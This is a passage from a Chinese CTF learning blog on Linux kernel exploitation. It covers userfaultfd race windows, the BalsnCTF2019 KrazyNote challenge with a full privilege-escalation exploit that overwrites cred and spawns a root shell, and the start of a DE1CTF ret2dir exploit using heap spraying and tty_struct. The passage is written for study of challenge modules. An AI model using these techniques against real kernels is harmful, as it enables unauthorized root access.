    for(;start_addr < end_addr;start_addr+=0x1000){

        //strncpy(ini_buf,usr_buf,8);
        memset(usr_buf,'\x00',BUFSZ);
        //sprintf(usr_buf,"%llu",&start_addr);
        LongToStr(start_addr);
        //write to the bss
        Write(fd,0xc7,0xfff2ff9da00023f2L,0x10);
        //read to usr_buf
        Read(fd,0,0,BUFSZ);
        //find
        result = memmem(usr_buf,BUFSZ,hidden_str,16);
		if (result)
		{
            printf("[*]find success:0x%llx\n",start_addr);
			cred = *(size_t *)(result - 0x8);
			real_cred = *(size_t *)(result - 0x10);
			if( (cred||0xff00000000000000) && (real_cred == cred)){
				//printf("[]%lx[]",result-(int)(buf));
				target_addr = start_addr + result-(int)(usr_buf);
				printf("[+]found task_struct 0x%lx\n",target_addr);
				printf("[+]found cred 0x%lx\n",real_cred);
				break;
			}

		}
    }
    //slab hijack
    memset(usr_buf,'\x00',BUFSZ);
    LongToStr(cred);
    for(int i = 3;i > 0;i--)
        Free(fd,i);
    //


    Write(fd,0xc7,heap_base+0x100-0x000d00620000002eL,0x8);
    Write(fd,0xc7,0xffff88801e3e3100-0x000d00620000002eL,0x8);
    Write(fd,0xc7,0xffff88801e3e3000-0x000d00620000002eL,0x8);
    //Read(fd,0xc7,0xfff2ff9da00023f2L,0x8);
    Malloc(fd,1,ini_buf);
    Write(fd,0xc7,0xffff88801e3e3100-0x000d00620000002eL,0x10);
    Write(fd,0xc7,0xffff88801e3e3000-0x000d00620000002eL,0x8);
    size_t final[0x100];
    memset(final,'\x00',sizeof(final));
    int idx = 0;
    final[idx++] = 0x3;
    for(int i = 0;i < 5;i++)
        final[idx++] = 0;
    for(int i = 0;i < 3;i++)
        final[idx++] = 0x0000003fffffffff;
    final[idx++] = 0;
    final[idx++] = 0xffffffff8183e420;
    final[idx++] = 0xffffffff8183e4a0;
    final[idx++] = 0xffff88800012f6a0;
    final[idx++] = 0;
    final[idx++] = 0;
    final[idx++] = 0;
    final[idx++] = 0xffff88800001f980;
    for(int i = 0;i < 5;i++)
        final[idx++] = 0;
    for(int i = 0;i < 3;i++)
        final[idx++] = 0x0000003fffffffff;
    final[idx++] = 0;
    final[idx++] = 0xffffffff8183e420;
    final[idx++] = 0xffffffff8183e4a0;
    final[idx++] = 0xffff88800012f6a0;
    final[idx++] = 0;
    final[idx++] = 0;
    final[idx++] = 0;
    final[idx++] = 1;
    final[idx++] = 0;
    //
    Read(fd,0xc7,cred-0x000d00620000002eL,0x100*8);
    char zero[0x28];
    memset(usr_buf,'\x00',0x30);
    usr_buf[0] = '\x03';
    Malloc(fd,2,usr_buf);
    //
    for(int i = 10;i > 3;i--)
        Free(fd,i);
    if(getuid() == 0){
        system("id");
    }
    return 0;
}

```

## 使用userfaultfd缺页扩大窗口期

### 介绍

之前想复现n1ctf的babykernel和de1ctf的race，发现官方题解中都有mmap的部分，一直不是很理解，终于在先知上找到一篇相关的[文章](https://xz.aliyun.com/t/6653)，写的非常详细，因此自己实践了一下(照着exp打了一遍)，记录一下userfaultfd的使用

### BalsnCTF2019 KrazyNote

#### 背景知识

###### 页和虚内存

内核的内存主要有两个区域，RAM和交换区，将要被使用的内存放在RAM，暂时用不到的内存放在交换区，内核控制交换进出的过程。RAM中的地址是物理地址，内核使用虚拟地址，其通过多级页表建立虚拟地址到物理地址的映射

###### 页调度和延迟加载

有的内存既不在RAM又不在交换区，比如mmap出来的内存，这块内存在读写它之前实际上并没有被创建（没有映射到实际的物理页），例如`mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0);`实际上并没有把fd对应的内容拷贝到这块区域，只是将地址`0x1337000`映射到`fd`这个文件。

当有以下代码访问时：

```c
char *a = (char *)0x1337000
printf("content: %c\n", a[0]);
```
内核会做以下事情：
1. 为0x1337000创建物理帧
2. 从fd读取内容到0x1337000
3. 增加一个页表的索引

总之，如果是初次访问mmap的页，`耗时会很长，导致上下文切换以及当前线程的睡眠`


##### 别名页

没有ABI可以直接访问物理帧，但内核有时候需要需要修改物理帧的值(例如修改页表入口)，于是引入了别名页，将物理帧映射到虚拟页。在每个线程的启动和退出过程中，一般都有两个物理帧映射到它。别名页的地址一般是`SOME_OFFSET+physical_addr`

##### userfaultfd机制

这个机制可以让用户自己处理缺页，可以在用户空间定义一个`userfault handler`，用法见[官方文档](http://man7.org/linux/man-pages/man2/userfaultfd.2.html)。大概步骤如下：
1. 创建一个描述符uffd：所有的注册区间、配置和最终缺页处理都需要ioctl对这个fd进行处理。我们可以用UFFDIO_REGISTER注册一块监视区域，这个区域发生缺页的时候使用UFFDIO_COPY向缺页地址拷贝数据
2. 用UFFDIO_REGISTER注册监视区域
3. 创建专用线程用来轮询和处理缺页事件

观察可以发现其中大部分操作都是固定的，我们可以自己整理一个头文件加进去，用的时候很方便。

```c

void register_userfault()
{
    struct uffdio_api ua;
    struct uffdio_register ur;
    pthread_t thr;

    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if(ioctl(uffd,UFFDIO_API,&ua) == -1){
        ErrExit("[-]ioctl UFFDIO API");
    }
    if(mmap(FAULT_PAGE,0x1000,7,0x22,-1,0) != FAULT_PAGE)
        ErrExit("[-]mmap failed!");
    ur.range.start = (unsigned long)FAULT_PAGE;
    ur.range.len = 0x1000;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd,UFFDIO_REGISTER,&ur) == -1)
        ErrExit("[-]ioctl UFFDIO Register");
    //register the func
    int s = pthread_create(&thr,NULL,handler,(void*)uffd);
    if(s != 0)
        ErrExit("[-]pthread create error");
}

static void * fault_handler_thread(void *arg)
{    
    // 轮询uffd读到的信息需要存在一个struct uffd_msg对象中
    static struct uffd_msg msg;
    // ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象
    struct uffdio_copy uffdio_copy;
    uffd = (long) arg;
      ......
    for (;;) { // 此线程不断进行polling，所以是死循环
        // poll需要我们构造一个struct pollfd对象
        struct pollfd pollfd;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        poll(&pollfd, 1, -1);
        // 读出user-fault相关信息
        read(uffd, &msg, sizeof(msg));
        // 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件
        assert(msg.event == UFFD_EVENT_PAGEFAULT);
        // 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault
        /*
        我们自己的处理逻辑
        */
        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        // page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中
        ioctl(uffd, UFFDIO_COPY, &uffdio_copy);
          ......
    }
}

```

#### 漏洞分析

这个内核模块逆的时候看起来很麻烦，结合别人博客的分析搞清楚了逻辑，其实是在`bss`上一块大小为`0x2000`的区域模拟`heap`的分配，首先搞清楚我们输入的数据结构和内核模块存储的单个数据结构。用户输入的结构体类型为`UserAttr`，其中`idx`指明note的索引，length对应分配的大小，user_buf为拷贝到note里content_arr的字符串或者从中读取数据的字符串。

一个note struct由四个成员组成，第一个是`key`，这个值根据原作者的分析是`task_struct.mm->pgd,页全局目录的存放位置)`,`length`是后面content_arr动态数组的大小(最大不超过0x100)，`contentPtr`保存的是`content_arr-page_offset_base`这里的`page_off_base`就是我们之前提到的那个别名页的`SOME_OFFSET`。最后的`content_arr`是一个动态数组，其大小由`New`的时候用户给的`length`决定

```c
/*
00000000 UserAttr        struc ; (sizeof=0x18, mappedto_3)
00000000                                         ; XREF: unlocked_ioctl/r
00000000 idx             dq ?                    ; XREF: unlocked_ioctl+26/w
00000000                                         ; unlocked_ioctl+6A/r ...
00000008 length          dq ?                    ; XREF: unlocked_ioctl+2E/w
00000008                                         ; unlocked_ioctl+6E/r ...
00000010 user_buf        dq ?                    ; XREF: unlocked_ioctl+4D/w
00000010                                         ; unlocked_ioctl:loc_1AE/r ...
00000018 UserAttr        ends
00000018
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 node            struc ; (sizeof=0x118, mappedto_4)
00000000 key             dq ?
00000008 length          dq ?
00000010 contentPtr      dq ?
00000018 content_arr     db 256 dup(?)
00000118 node            ends
00000118

*/

```

从`init_module`开始，注册了一个设备在0x620，设备名下面就是用户自己定义的`file_ops`,而0x680全是空，也就是说全部使用默认的操作函数。看下源码会发现这里的`ioctl`是`unlocked_ioctl`也就是存在竞争

```c
__int64 __fastcall init_module(__int64 a1, __int64 a2, __int64 a3)
{
  _fentry__(a1, a2, a3);
  bufPtr = (node *)&unk_B60;
  return misc_register(&dev);
}

/*
.data:0000000000000620 0B                      dev             db  0Bh                 ; DATA XREF: init_module+5↑o
.data:0000000000000620                                                                 ; cleanup_module+5↑o
.data:0000000000000621 00                                      db    0
.data:0000000000000622 00                                      db    0
.data:0000000000000623 00                                      db    0
.data:0000000000000624 00                                      db    0
.data:0000000000000625 00                                      db    0
.data:0000000000000626 00                                      db    0
.data:0000000000000627 00                                      db    0
.data:0000000000000628 9C 04 00 00 00 00 00 00                 dq offset aNote         ; "note"
.data:0000000000000630 80 06 00 00 00 00 00 00                 dq offset unk_680
.data:0000000000000638 00 00 00 00 00 00 00 00+                align 80h
.data:0000000000000680 00                      unk_680         db    0                 ; DATA XREF: .data:0000000000000630↑o
.data:0000000000000681 00                                      db    0
.data:0000000000000682 00                                      db    0
.data:0000000000000683 00                                      db    0
.data:0000000000000684 00                                      db    0
.data:0000000000000685 00                                      db    0
.data:0000000000000686 00                                      db    0
.data:0000000000000687 00                                      db    0
.data:0000000000000688 00                                      db    0
.data:0000000000000689 00                                      db    0
*/

// file_operations结构
struct file_operations {
    struct module *owner;
    loff_t (*llseek) (struct file *, loff_t, int);
    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
    ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
    ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
    int (*iopoll)(struct kiocb *kiocb, bool spin);
    int (*iterate) (struct file *, struct dir_context *);
    int (*iterate_shared) (struct file *, struct dir_context *);
    __poll_t (*poll) (struct file *, struct poll_table_struct *);
    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);

    ... truncated
};
```

继续分析模块的功能会发现实现了四个功能，分别是`New`、`Delete`、`Show`和`Edit`。其中New的功能就是根据用户给的length从全局的内存中取一块作为`notes[req.idx]`并分配一块`content_arr[length]`，之后将全局指针对应向后偏移，拷贝的用户数据要先异或`key`再存入其中

```c
if ( (unsigned int)arg2 <= -'\xFF' )
  {
    if ( (_DWORD)arg2 != -256 )
      return -25;
    req.idx = -1LL;                             // -256->new
    idx2 = 0LL;
    while ( 1 )
    {
      idx3 = (signed int)idx2;
      if ( !notes[idx2] )
        break;
      if ( ++idx2 == 0x10 )
        return -14;
    }
    new_node = bufPtr;
    req.idx = idx3;
    notes[idx3] = bufPtr;
    new_node->length = v4;
    new_node_content_arr = new_node->content_arr;
    new_node->key = *(_QWORD *)(*(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 0x7E8) + 0x50LL);
    user_n = req.length;
    user_buf2 = req.user_buf;
    bufPtr = (node *)((char *)new_node + req.length + 24);// mov it to next free space
    if ( req.length > 0x100uLL )
    {
      _warn_printk("Buffer overflow detected (%d < %lu)!\n", 0x100LL, req.length);
      BUG();
    }
    _check_object_size(encBuffer, req.length, 0LL);
    copy_from_user(encBuffer, user_buf2, user_n);// copy userbuf to stack
    req_len = req.length;
    node_addr2 = notes[req.idx];
    if ( req.length )
    {
      i = 0LL;
      do
      {
        encBuffer[i / 8] ^= node_addr2->key;    // xor the key
        i += 8LL;
      }
      while ( i < req_len );
    }
    memcpy(new_node_content_arr, encBuffer, req_len);// copy to the third node
    result = 0;
    node_addr2->contentPtr = (__int64)&new_node_content_arr[-page_offset_base];// set contentPtr

```

`Delete`函数清空全局内存区并将分配的指针指向开头。

```c
if ( (_DWORD)arg2 != -254 )
    {
      notes1 = notes;
      if ( (_DWORD)arg2 == -253 )               // -253->delete
      {
        do
        {
          *notes1 = 0LL;
          ++notes1;
        }
        while ( &_check_object_size != (__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))notes1 );
        result = 0;
        bufPtr = (node *)&unk_B60;
        memset(&unk_B60, 0, 0x2000uLL);
        return result;
      }
      return -25;
```

`Show`函数按照`notes[idx].length`把`content_arr`内容拷贝到用户态空间，这个过程是先拿`contentPtr+page_offset_base`找到`content_arr`，再把其中的内容异或`key`拷贝

```c
v10 = notes[idx];                           // -254->show
    result = 0;
    if ( v10 )
    {
      v11 = LOBYTE(v10->length);
      v12 = (_DWORD *)(v10->contentPtr + page_offset_base);
      if ( (unsigned int)v11 >= 8 )
      {
        *(__int64 *)((char *)&encBuffer[-1] + LOBYTE(v10->length)) = *(_QWORD *)((char *)v12 + LOBYTE(v10->length) - 8);
        qmemcpy(encBuffer, v12, 8LL * ((unsigned int)(v11 - 1) >> 3));
      }
      else if ( v11 & 4 )
      {
        LODWORD(encBuffer[0]) = *v12;
        *(_DWORD *)((char *)encBuffer + (unsigned int)v11 - 4) = *(_DWORD *)((char *)v12 + (unsigned int)v11 - 4);
      }
      else if ( LOBYTE(v10->length) )
      {
        LOBYTE(encBuffer[0]) = *(_BYTE *)v12;
        if ( v11 & 2 )
          *(_WORD *)((char *)encBuffer + (unsigned int)v11 - 2) = *(_WORD *)((char *)v12 + (unsigned int)v11 - 2);
      }
      if ( v11 )
      {
        v13 = 0LL;
        do
        {
          encBuffer[v13 / 8] ^= v10->key;
          v13 += 8LL;
        }
        while ( v13 < v11 );
      }
      user_buf3 = req.user_buf;
      _check_object_size(encBuffer, v11, 1LL);
      copy_to_user(user_buf3, encBuffer, v11);
      result = 0;
    }
```

Edit函数和Show差不多，也是先计算再拷贝，这里的问题就是`copy_from_user`并不是原子性的操作，也并没有上锁，按照我们之前的分析缺页可以让其有一个很大的空窗期供我们操作，进而利用竞争改掉某些关键数据

```c
  if ( (_DWORD)arg2 == -'\xFF' )                // -255->edit
  {
    node_addr = notes[idx];
    if ( node_addr )
    {
      chunk_size = LOBYTE(node_addr->length);
      user_buf1 = req.user_buf;
      v18 = (_QWORD *)(node_addr->contentPtr + page_offset_base);// recover
      _check_object_size(encBuffer, chunk_size, 0LL);
      copy_from_user(encBuffer, user_buf1, chunk_size);
      if ( chunk_size )
      {
        node_addr1 = notes[req.idx];
        cpy_idx = 0LL;
        do
        {
          encBuffer[cpy_idx / 8] ^= node_addr1->key;
          cpy_idx += 8LL;
        }
        while ( chunk_size > cpy_idx );
        if ( (unsigned int)chunk_size >= 8 )
        {
          *v18 = encBuffer[0];
          *(_QWORD *)((char *)v18 + (unsigned int)chunk_size - 8) = *(__int64 *)((char *)&encBuffer[-1]
                                                                               + (unsigned int)chunk_size);
          result = 0;
          qmemcpy(
            (void *)((unsigned __int64)(v18 + 1) & 0xFFFFFFFFFFFFFFF8LL),
            (const void *)((char *)encBuffer - ((char *)v18 - ((unsigned __int64)(v18 + 1) & 0xFFFFFFFFFFFFFFF8LL))),
            8LL * (((unsigned int)chunk_size + (_DWORD)v18 - (((_DWORD)v18 + 8) & 0xFFFFFFF8)) >> 3));
          return result;
        }
      }
      if ( chunk_size & 4 )
      {
        *(_DWORD *)v18 = encBuffer[0];
        *(_DWORD *)((char *)v18 + (unsigned int)chunk_size - 4) = *(_DWORD *)((char *)encBuffer
                                                                            + (unsigned int)chunk_size
                                                                            - 4);
        return 0;
      }
      if ( (_DWORD)chunk_size )
      {
        *(_BYTE *)v18 = encBuffer[0];
        if ( chunk_size & 2 )
          *(_WORD *)((char *)v18 + (unsigned int)chunk_size - 2) = *(_WORD *)((char *)encBuffer
                                                                            + (unsigned int)chunk_size
                                                                            - 2);
      }
    }
    return 0;
```

#### 漏洞利用

我们先创建一个buf为0x10大小的note0，在Edit的过程中我们利用usefaultfd的handler在成功拷贝之前释放所有note，再创建一个新的Note0和Note1，其buf大小均为0，在使用ioctl向缺页部分拷贝的时候我们把这个页的`buf[8]`改为`0xf0`，这样拷贝之后原来`buf[8]`的部分实际上是`note1.length`，进而我们可以越界读写`note1`。

1. leak key:直接`Show(1)`，因为我们把note1的length改为了非零值，因此会输出`0 xor key`，得到Key值
2. leak module base:注意我们现在泄露的只是一个相对值(module_base-page_offset_base)，但是无所谓，因为最终show的时候会加上这个偏移。创建Note2则`note2.contentPtr`即为`note2.content_arr-page_offset_base`，show(1)即可泄露出来这个值，再减去它到模块基地址的偏移即为模块相对基址
3. leak page_offset_base:泄露这个值就比较麻烦了，我们先来看一个指令`000000001F7 4C 8B 25 12 2A 00 00                    mov     r12, cs:page_offset_base`，这个调用实际含义是`mov r12,[rip+offset]`，而这个offset存储在`module_base+0x1fa`，我们的思路就有了，先修改note2的key为0，length为4，contentPtr为`module_base+0x1fa`，得到这个4字节的偏移，再用相同方式泄露出`(module_base+0x1fe)+offset`的值，即为所求
4. leak cred:通过之前提到的search搜索的方式
5. 用任意写修改cred的对应数据位
6. execv(注意不是execve)起新的shell(这个shell会继承当前进程的uid)

#### exp.c

如前所述基本是照着打了一遍，再次感谢`bsauce`师傅的文章

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>

#define NewCmd (-256)
#define DeleteCmd (-253)
#define ShowCmd (-254)
#define EditCmd (-255)

#define BUFSZ 0x1000
#define FAULT_PAGE ((void*)(0x1337000))



typedef struct node
{
    size_t key;
    size_t length;
    char* contentPtr;
}Node;

typedef struct userAttr
{
    size_t idx;
    size_t length;
    char* user_buf;
}attr;

char buf[0x1000];
int fd;

void ErrExit(char* msg)
{
    puts(msg);
    exit(-1);
}

void Init()
{
    memset(buf,'\x00',0x1000);
    fd = open("/dev/note",0);
    if(fd < 0)
        ErrExit("[-]open dev failed");
    puts("[+]open success");
}


void New(char* usr_buf,uint8_t length)
{
    attr my_attr;
    my_attr.length = length;
    my_attr.user_buf = buf;
    if(ioctl(fd,-256,&my_attr) < 0)
        ErrExit("[-]create failed");
    
}


void Delete()
{
    attr my_attr;
    if(ioctl(fd,-253,&my_attr) < 0)
        ErrExit("[-]delete error");
}

void Show(uint8_t idx,char* usr_buf)
{
    attr my_attr;
    my_attr.idx = idx;
    my_attr.user_buf = usr_buf;

    if(ioctl(fd,-254,&my_attr) < 0)
        ErrExit("[-]failed to show");
}

void Edit(uint8_t idx,size_t length,char* usr_buf)
{
    attr my_attr;
    my_attr.idx = idx;
    my_attr.length = length;
    my_attr.user_buf = usr_buf;
    if(ioctl(fd,-255,&my_attr) < 0)
        ErrExit("[-]failed to Edit");
}



void* handler(void* arg)
{
   unsigned long uffd = (unsigned long)arg;
   struct uffd_msg msg;

   puts("[+] Handler created");
   struct pollfd poll_fd;
   int ready;
   poll_fd.fd = uffd;
   poll_fd.events= POLLIN;
   ready = poll(&poll_fd,1,-1);
   if(ready != 1)
    ErrExit("[-]poll failed!");
   puts("[+]Now we got to inject dirty code");

   Delete();
   New(buf,0);
   New(buf,0);

   //init:node0+0x10buf
   //now:node0+node1
   if(read(uffd,&msg,sizeof(msg)) != sizeof(msg))
       ErrExit("[-]Error reading msg");
   struct uffdio_copy uc;
   memset(buf,'\x00',sizeof(buf));
   buf[8] = 0xf0;//overwrite the note1's size = 0xf0
   uc.src = (unsigned long)buf;
   uc.dst = (unsigned long)FAULT_PAGE;
   uc.len = 0x1000;
   uc.mode = 0;
   ioctl(uffd,UFFDIO_COPY,&uc);
   puts("[*]userfault process success");

   return NULL;

}

void register_userfault()
{
    struct uffdio_api ua;
    struct uffdio_register ur;
    pthread_t thr;

    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if(ioctl(uffd,UFFDIO_API,&ua) == -1){
        ErrExit("[-]ioctl UFFDIO API");
    }
    if(mmap(FAULT_PAGE,0x1000,7,0x22,-1,0) != FAULT_PAGE)
        ErrExit("[-]mmap failed!");
    ur.range.start = (unsigned long)FAULT_PAGE;
    ur.range.len = 0x1000;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd,UFFDIO_REGISTER,&ur) == -1)
        ErrExit("[-]ioctl UFFDIO Register");
    //register the func
    int s = pthread_create(&thr,NULL,handler,(void*)uffd);
    if(s != 0)
        ErrExit("[-]pthread create error");
}

int main()
{

    Init();
    New(buf,0x10);
    register_userfault();
    //create the 0x10 buf
    Edit(0,1,FAULT_PAGE);
    //now we mmap a address for later use
    //1.leak key:0 xor key == key
    Show(1,buf);
    unsigned long key = *(unsigned long*)buf;
    printf("[*]leak key:%lx\n",key);
    //note0:0x10
    //note1:0x10(size changed to 0xf0)
    //2.leak module base(real_module_base - base_page_off)
    New(buf,0);//node2
    Show(1,buf);
    unsigned long bss_addr = *(unsigned long*)(buf+0x10) ^ key;
    unsigned long module_base = bss_addr - 0x2568;
    printf("[*]leak module base(sub page_base_offset):%lx\n",module_base);
    //3.leak page_base_off
    //overwrite the note2's contentPtr to module_base+0x1fa
    unsigned long page_offset_base = module_base+0x1fa;
    unsigned long* fake_note = (unsigned long*)buf;
    int page_offset_base_off;
    memset(buf,'\x00',sizeof(buf));
    fake_note[0] = 0 ^ key;
    fake_note[1] = 4 ^ key;//we only need four bytes
    fake_note[2] = page_offset_base ^ key;
    Edit(1,0x18,buf);
    Show(2,(char*)&page_offset_base_off);
    page_offset_base = module_base + 0x1fe + page_offset_base_off;
    printf("[*]leak page_base_offset:%lx\n",page_offset_base);
    //4.now we leak rael page off base
    fake_note[0] = 0 ^ key;
    fake_note[1] = 8 ^ key;
    fake_note[2] = page_offset_base ^ key; 
    unsigned long long base_addr;
    Edit(1,0x18,buf);
    Show(2,(char*)&base_addr);
    printf("[*]leak real page base offset:%llx\n",base_addr);
    //search cred using task_struct
    prctl(PR_SET_NAME,"[*]WuHanJiaYou!");//
    unsigned long* task;
    for(size_t i; ;i += 0xf0){
        fake_note[0] = 0 ^ key;
        fake_note[1] = 0xf0 ^ key;
        fake_note[2] = i ^ key;
        Edit(1,0x18,buf);
        Show(2,buf);
        task = (unsigned long*)memmem(buf,0xf0,"[*]WuHanJiaYou!",16);
        if(task != NULL){
            printf("[+]found success,task:%p,cred:0x%lx,real_cred:0x%lx\n",task,task[-1],task[-2]);
            if(task[-1]>0xffff000000000000 && task[-2]>0xffff000000000000)
                break;
        }
    }
    //ovwrite cred
    fake_note[0] = 0 ^ key;
    fake_note[1] = 0x28 ^ key;
    fake_note[2] = (task[-2]+4-base_addr) ^ key;
    Edit(1,0x18,buf);
    memset(buf,'\x00',0x30);
    Edit(2,0x28,buf);
    char* args[2] = {"/bin/sh",NULL};
    execv("/bin/sh",args);
    return 0;
}
```

## ret2dir

### 简介

这种攻击最早是在`DE1CTF`见到的，当时`ycx`学长的博客有相关实践，当时对于内核完全摸不着头脑，现在大概懂了一些基本trick，翻一下`de1ta`在先知给的[writeup](https://xz.aliyun.com/t/5944#toc-9)，尝试学习一波。

### DE1CTF Race

#### 程序分析 && 漏洞利用

跟之前那道题差不多，先看下自己实现的fops，发现全是空，ioctl是没有上锁的，`copy_from_user`和`copy_to_user`都是非原子操作。实现了`New`、`Edit`、`Show`和`Delete`功能。之前那道题目提到了别名页，实际上就是这里的`physmap`。

开始我自己想用的是之前提到的userfaultfd来保证竞争的结果可控，后来发现这个API好像用不了，只能利用mmap缺页造成的短暂中断间隙进行竞争删除。

官方的给的思路前面是用到了`physmap`的特性，就是这个地址的基址实际上是物理地址`physical_addr+offset`，可以绕过地址随机化。我们在`Show`的时候竞争删除，从而泄露出`slab`地址，根据官方的解释`physmap`的地址应该在`slab`前面，且包含`slab`，这个个人感觉是有依据的，之前在做xman那道题的时候看p4nda师傅博客给的爆破地址的起始地址就是没有开地址随机化的`physmap`位置。

猜测了`physmap`地址(不一定是起始地址，但是是在这个区域中的一个地址)，我们先用堆喷占位`physmap`区域，为了提高命中率我们分配的内存大小为`64M`，是整个进程的一半。在`Edit`的时候竞争删除，从而可以往`slab`的`fd`竞争写入刚才猜的地址。

后面官方的做法是分配`tty_struct`结构体，因为我们现在`slab`从`physmap`开始分配，`tty_struct`会分配到这块区域，之后我们`check`堆喷到的内存查看有无非零区域(`tty_struct`结构体里有一堆函数指针)，遇到非零值就说明找到了`slab_addr`并可以通过函数指针及偏移找到`vmlinux_base`，再往后官方是从`tty_struct`下手，我觉得既然有竞争的`UAF`可以改`modprobe_path`，应该更简单一点。

#### exp.c

自己实在是懒得写(或抄)exp，作为kernel入门篇的最后一篇文章也还是以官方的writeup收尾。注意这个exp后面有一个自己写内核shellcode的部分需要自己补充(这就是为什么我说不如改`modprobe_path`方便的原因)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>

#define test_ioctl_read		0x23333
#define test_ioctl_write	0x23334
#define test_ioctl_del		0x23335
#define thread_num		10	//local 0x10; server 10
#define mp_size			1024*64 //64K
#define spray_times		32*32	// heap spray size : 64K*16*32 = 32M
#define kernel_offset		0x106b4e0
#define set_memory_x		0x55580

void *spray[spray_times];
int fd = 0;
int ptmx;

struct data_struct
{
	unsigned long size;
	char *buf;
}data;

void error_quit(char *arg)
{
	perror(arg);
	exit(-1);
}

void ex(char *arg)
{
	fprintf(stderr,"%s\n",arg);
	exit(-1);
}

void *race_kill(void *arg)
{
	ioctl(fd,test_ioctl_del, &data);
	return NULL;
}

unsigned long race_read()
{
        void *mp;
	struct data_struct data;
	pthread_t tid[thread_num];
	int i;
	char buf[0x2c0];

	memset(buf, 'a', 0x20);
        if ((mp = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)
                error_quit("mmap error");
	data.size = 0x2c0;
	data.buf = (void *)buf;
	ioctl(fd, test_ioctl_read, &data);
	data.size = 7;
	data.buf = mp;

	for (i = 0; i < thread_num; i++)
		if (pthread_create(&tid[i], NULL, race_kill, NULL) != 0)
			error_quit("pthread_create error");
	ioctl(fd, test_ioctl_write, &data);
	for (i = 0; i < thread_num; i++)
		pthread_join(tid[i],NULL);
	data.size = 0x2c0;
	ioctl(fd, test_ioctl_read, &data);
        return *(unsigned long *)mp;
}

void write_through(unsigned long write_addr)
{
	int wfd;
	int ret;
	unsigned char *buf;
	ret = posix_memalign((void **)&buf, 512, 1024);
	if (ret)
		error_quit("posix_memalign failed");
	*(unsigned long *)buf = write_addr;
	wfd = open("./data", O_WRONLY | O_DIRECT | O_CREAT, 0755);
	if (wfd == -1)
		error_quit("open data failed");
	if (write(wfd, buf, 1024) < 0)
		error_quit("write data failed");

	free(buf);
	close(wfd);
}

void race_write()
{
	int i = 0;
	pthread_t tid[thread_num];
	int wfd = open("./data",O_RDWR);
	if (wfd == -1)
		error_quit("open data failed");
	char *p = mmap(NULL,4096,PROT_READ,MAP_PRIVATE,wfd,0);
	if (p == MAP_FAILED)
		error_quit("data mmap failed");
	data.buf = (void *)p;
	data.size = 0x2c0;
	for (i = 0; i < thread_num; i++)
		if (pthread_create(&tid[i], NULL, race_kill, NULL) != 0)
			error_quit("pthread_create error");	
	ioctl(fd, test_ioctl_read, &data);	
	for (i = 0; i < thread_num; i++)
		pthread_join(tid[i],NULL);
	ptmx = open("/dev/ptmx",O_RDWR);
	close(wfd);
}

void heap_spray()
{
	int i = 0;
	void *mp;
	for (i = 0; i < spray_times; i++)
	{
        	if ((mp = mmap(NULL, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)
                	error_quit("mmap error");
		memset(mp, 0, mp_size);
		spray[i] = mp;
	}	
}

unsigned long *check()
{
	int i = 0;
	for (i = 0; i < spray_times; i++)
	{
		unsigned long *p = spray[i];
		int j = 0;
		while (j < mp_size/8)
		{
			if (p[j] != 0)
				return &p[j];
			j += 512;
		}
	}
	return NULL;
}

int get_ptmx_slave()
{
	const char *pts_name;
	if (grantpt(ptmx) < 0 || unlockpt(ptmx) < 0) 
		error_quit("grantpt and unlockpt fail\n");

	pts_name = (const char *)ptsname(ptmx);
	int fds = open(pts_name, O_RDONLY | O_NOCTTY);
	if (fds < 0) 
		error_quit("open /dev/ptmx fail\n");
	return fds;
}

int main()
{
	// int t[0x100];
	int i = 0;
	/* for (i = 0; i < 0x100; i++)
	{
		t[i] = open("/dev/ptmx",O_RDWR);
		if (t[i] == -1)
			error_quit("open ptmx error");
	}
	for (i = 0; i < 0x100; i++)
		close(t[i]);
	*/
	unsigned long slab_addr;
	unsigned long kernel_base;
	int pts;
        if ((fd = open("/dev/test",O_RDWR)) == -1)
		error_quit("open test.ko error");
	slab_addr = race_read();
	if (slab_addr < 0xff000000000000)
	{
		char buf[0x100];
		sprintf(buf, "%s:0x%lx","slab addr failed",slab_addr);
		ex(buf);
	}
	slab_addr = slab_addr | 0xff00000000000000;
